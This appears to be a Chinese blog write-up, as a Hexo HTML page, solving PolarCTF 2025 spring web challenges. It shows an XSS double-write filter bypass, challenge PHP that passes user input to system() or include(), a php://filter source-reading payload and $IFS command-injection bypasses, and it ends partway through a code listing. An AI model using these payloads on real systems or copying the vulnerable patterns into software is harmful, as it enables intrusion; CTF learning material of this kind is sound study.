@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这次的polar ctf春季赛还是很不错的，这里把web都复现了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PolarCTF 2025春季赛 &amp; Web">
+<meta property="og:url" content="http://example.com/2025/03/25/PolarCTF-2025-%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="F0T1-CTF">
+<meta property="og:description" content="这次的polar ctf春季赛还是很不错的，这里把web都复现了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/Drops%40%E9%B9%8F%E9%B9%8F.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323153232724.png">
+<meta property="og:image" content="http://21416c29-d78d-4dc8-a81d-9dc18ee55f1f.www.polarctf.com:8090/hidden_image.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154512940.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154610261.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154845297.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154943334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323160633861.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323160745419.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323160951093.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323161958430.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323162726803.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323162947754.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323163727327.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323164446130.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323211443224.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323211659020.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213132241.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213546720.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213903575.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213957120.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323214137745.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323215525170.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250324215316924.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250324215012908.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155322679.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250324215149671.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155219022.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325154656828.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155728523.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155745099.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325170526514.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325170926848.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325170943554.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325172153029.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323123742579.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323123909823.png">
+<meta property="article:published_time" content="2025-03-25T12:44:00.000Z">
+<meta property="article:modified_time" content="2025-03-25T12:05:01.935Z">
+<meta property="article:author" content="CTF-DUAN">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/Drops%40%E9%B9%8F%E9%B9%8F.jpg">
+
+<link rel="canonical" href="http://example.com/2025/03/25/PolarCTF-2025-%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>PolarCTF 2025春季赛 & Web | F0T1-CTF</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">F0T1-CTF</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">从0到1CTFer成长之路</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/25/PolarCTF-2025-%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/F0T0ne/Image/logo.jpg">
+      <meta itemprop="name" content="CTF-DUAN">
+      <meta itemprop="description" content="CTF学习">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="F0T1-CTF">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PolarCTF 2025春季赛 & Web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-25 20:44:00 / 修改时间：20:05:01" itemprop="dateCreated datePublished" datetime="2025-03-25T20:44:00+08:00">2025-03-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/WP/" itemprop="url" rel="index"><span itemprop="name">WP</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">这次的polar ctf春季赛还是很不错的，这里把web都复现了</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="PolarCTF-2025春季赛-Web"><a href="#PolarCTF-2025春季赛-Web" class="headerlink" title="PolarCTF 2025春季赛 &amp; Web"></a>PolarCTF 2025春季赛 &amp; Web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a target="_blank" rel="noopener" href="https://space.bilibili.com/3546382988216798?spm_id_from=333.337.0.0">PolarCTF的个人空间-PolarCTF个人主页-哔哩哔哩视频</a></p>
+<hr>
+<p>讲的很不错，难得有比赛官方专门提供讲解视频，可以随时复现学习，还有免费的赛题复现环境</p>
+<p>某些比赛方，连WP都不发，还没有赛题复现平台</p>
+<p>PilarCTF真是太太太好了！！！</p>
+<p>后续可以照着视频集锦，把往年的题目刷一遍，这比盲目刷题复习爽太多了，还有讲解和复现平台，这质量，没说了，杠杠的！！！</p>
+<hr>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/Drops%40%E9%B9%8F%E9%B9%8F.jpg" alt="Drops@鹏鹏"></p>
+<p>混了个三等奖，还行</p>
+<hr>
+<p>这里给各个题目排一下难易，以及考查题型（题目星级，纯出于个人考虑，结合自身因素来评定的）</p>
+<table>
+<thead>
+<tr>
+<th>来个弹窗</th>
+<th>*</th>
+<th>简单xss</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>coke的登陆</td>
+<td>*</td>
+<td>信息收集，cookie泄露</td>
+</tr>
+<tr>
+<td>background</td>
+<td>*</td>
+<td>信息收集，js代码识别</td>
+</tr>
+<tr>
+<td>0e事件</td>
+<td>*</td>
+<td>0e字符串</td>
+</tr>
+<tr>
+<td>投喂2.0</td>
+<td>**</td>
+<td>.htaccess文件</td>
+</tr>
+<tr>
+<td>xCsMsD</td>
+<td>**</td>
+<td>rce，xss</td>
+</tr>
+<tr>
+<td>bllbl_rce</td>
+<td>*</td>
+<td>rce，源码泄露</td>
+</tr>
+<tr>
+<td>复读机RCE</td>
+<td>**</td>
+<td>rce，一点脑洞</td>
+</tr>
+<tr>
+<td>狗黑子CTF变强之路</td>
+<td>**</td>
+<td>rce，文件包含</td>
+</tr>
+<tr>
+<td>再给我30元</td>
+<td>**</td>
+<td>sql注入</td>
+</tr>
+<tr>
+<td>椰子树晕淡水鱼</td>
+<td>**</td>
+<td>信息收集，爆破，文件上传</td>
+</tr>
+<tr>
+<td>小白说收集很重要</td>
+<td>五星</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="来个弹窗"><a href="#来个弹窗" class="headerlink" title="来个弹窗"></a>来个弹窗</h2><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>提示是XSS，直接alert弹窗试一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323153232724.png" alt="image-20250323153232724"></p>
+<p>提示攻击成功，给了一张图片</p>
+<p><img src="http://21416c29-d78d-4dc8-a81d-9dc18ee55f1f.www.polarctf.com:8090/hidden_image.jpg" alt="img"></p>
+<p>直接谷歌搜索，得到 “白金之星”，md5后包裹交了</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这题考查的是script的双写绕过</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS我不太会，但alert确实能执行成功</p>
+<h2 id="coke的登陆"><a href="#coke的登陆" class="headerlink" title="coke的登陆"></a>coke的登陆</h2><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154512940.png" alt="image-20250323154512940"></p>
+<p>给了账号，还差密码，存在cookie泄露，泄露的信息应该就是密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154610261.png" alt="image-20250323154610261"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154845297.png" alt="image-20250323154845297"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323154943334.png" alt="image-20250323154943334"></p>
+<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ol>
+<li><strong>Cookie 是什么？</strong></li>
+</ol>
+<ul>
+<li>Cookie 是由 Web 服务器存储在用户电脑上的小型文本文件，用于跟踪用户行为和状态。</li>
+<li>特点：<ul>
+<li>存储在用户电脑上，类似于“身份证”。</li>
+<li>不同用户的 Cookie 通常不同。</li>
+<li>不能执行代码，也不能传播病毒，基本无害。</li>
+</ul>
+</li>
+<li>在 HTTP 报文中：<ul>
+<li>服务器通过 Set-Cookie 设置 Cookie。</li>
+<li>浏览器通过 Cookie 头发送 Cookie。</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li><strong>Cookie 欺骗是什么？</strong></li>
+</ol>
+<ul>
+<li>Cookie 欺骗是指攻击者伪造或篡改 Cookie，欺骗服务器以获取未授权访问。</li>
+<li>实现方式：<ul>
+<li><strong>窃取 Cookie</strong>：通过 XSS、网络嗅探等方式。</li>
+<li><strong>伪造 Cookie</strong>：修改 Cookie 内容（例如权限字段）。</li>
+<li><strong>利用 Cookie 注入</strong>：将恶意内容注入 Cookie，触发漏洞。</li>
+</ul>
+</li>
+</ul>
+<p>总而言之，</p>
+<p>cookie是浏览器给用户发的身份证，用于身份验证</p>
+<h2 id="bllbl-rce"><a href="#bllbl-rce" class="headerlink" title="bllbl_rce"></a>bllbl_rce</h2><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>进去后不管输入什么命令都不能执行，</p>
+<p>没办法，扫目录去，看看有没有源码泄露</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323160633861.png" alt="image-20250323160633861"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323160745419.png" alt="image-20250323160745419"></p>
+<p>看看源码，需要啥绕过吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$command</span>, <span class="string">&#x27;bllbl&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span> (<span class="variable">$command</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>包含bllbl就行了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323160951093.png" alt="image-20250323160951093"></p>
+<h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>正常RCE和源码泄露</p>
+<h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>进入后，在script.js中找到提示信息，但执行结果没有看到是在哪里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323161958430.png" alt="image-20250323161958430"></p>
+<p>hackbar执行没结果，上BP</p>
+<p>先前源码中没注意的话，在BP中也能很明显看出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323162726803.png" alt="image-20250323162726803"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323162947754.png" alt="image-20250323162947754"></p>
+<p>结束</p>
+<h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><p>正常信息收集</p>
+<h2 id="0e事件"><a href="#0e事件" class="headerlink" title="0e事件"></a>0e事件</h2><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>请通过 URL 参数 ‘a’ 提交你的输入。</p>
+<p>但是get传参都不行，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323163727327.png" alt="image-20250323163727327"></p>
+<p>结合题目提示0e字符串，随便找一个就过了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323164446130.png" alt="image-20250323164446130"></p>
+<h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><p>0e字符串，要结合题目名称</p>
+<h2 id="复读机RCE"><a href="#复读机RCE" class="headerlink" title="复读机RCE"></a>复读机RCE</h2><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>直接输命令，报错</p>
+<p>既然他问我想说什么，那我就让他说出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323211443224.png" alt="image-20250323211443224"></p>
+<p>加上echo后，就有输出了，执行多个命令试试</p>
+<p>直接rce了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323211659020.png" alt="image-20250323211659020"></p>
+<h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><p>一点脑洞吧+正常rce</p>
+<h2 id="xCsMsD"><a href="#xCsMsD" class="headerlink" title="xCsMsD"></a>xCsMsD</h2><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>简单注册后登录进去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213132241.png" alt="image-20250323213132241"></p>
+<p>直接ls有结果</p>
+<p>但是加上空格就不行了，</p>
+<p>空格替换，ls$IFS&#x2F;</p>
+<p>将&#x2F;转义，ls$IFS/</p>
+<p>还不行，看来XSS是时候排上用场了</p>
+<p>XSS读取cookie</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213546720.png" alt="image-20250323213546720"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%27+%27-%3E%27-%27%2C+%27%5C%27-%3E%27%2F%27</span><br><span class="line">url解码：</span><br><span class="line">&#x27;+&#x27;-&gt;&#x27;-&#x27;,+&#x27;\&#x27;-&gt;&#x27;/&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>第二个能看出来，第一个就不知道了，我也没用 + 啊</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213903575.png"></p>
+<p>cat禁用了，tac</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323213957120.png" alt="image-20250323213957120"></p>
+<p>其实空格过滤了，还能通过env读取环境变量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323214137745.png" alt="image-20250323214137745"></p>
+<p>对比能够发现，env中的flag是假的</p>
+<h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><p>XSS读取cookie</p>
+<p>符号替换</p>
+<p>rce绕过</p>
+<h2 id="狗黑子CTF变强之路"><a href="#狗黑子CTF变强之路" class="headerlink" title="狗黑子CTF变强之路"></a>狗黑子CTF变强之路</h2><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;page&quot;</span> <span class="attr">value</span>=<span class="string">&quot;miji.php&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;秘籍&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;page&quot;</span> <span class="attr">value</span>=<span class="string">&quot;fabao.php&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;法宝&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;page&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jinshouzhi.php&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;金手指&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>每次请求的url</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?page=fabao.php</span><br></pre></td></tr></table></figure>
+
+<p>存在文件包含，那就base读取一下源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?page=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="comment">// 简单的文件类型检查，只允许包含 php 文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;.php&#x27;</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;只允许包含 php 文件&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  。。。。。。。</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;欢迎来到 CTF 变强之路&lt;/h1&gt;</span><br><span class="line">    &lt;div id=<span 